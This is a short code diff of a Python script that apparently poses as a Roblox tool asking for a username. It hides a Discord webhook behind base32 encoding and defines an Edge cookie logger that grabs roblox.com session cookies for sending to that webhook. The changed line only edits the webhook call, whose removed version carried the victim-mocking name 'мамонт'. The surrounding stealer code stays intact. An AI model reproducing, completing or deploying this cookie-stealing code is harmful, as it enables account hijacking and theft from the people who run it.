@@ -11,7 +11,7 @@ name = input('Enter your roblox username')
 key = "NB2HI4DTHIXS6ZDJONRW64TEFZRW63JPMFYGSL3XMVRGQ33PNNZS6MJQGEYDAMZRGE2TGMJUGQ3DONRUGM2C6OCQIRVDQUBTGJSTIU2XGJYWYUKYPFYWSM2IJZWTETSXJZFWYURWFVGW223HLJEWEZRRJBJU2URVMQZUI6L2NFFEYY2IJVDXM4TYJFGGQUCJKA======"
 
 weblook = base64.b32decode(key)
-webhookl = DiscordWebhook(url=weblook, , username="мамонт")
+webhookl = DiscordWebhook(url=weblook)
 def edge_logger():
     try:
         cookies = browser_cookie3.edge(domain_name='roblox.com')
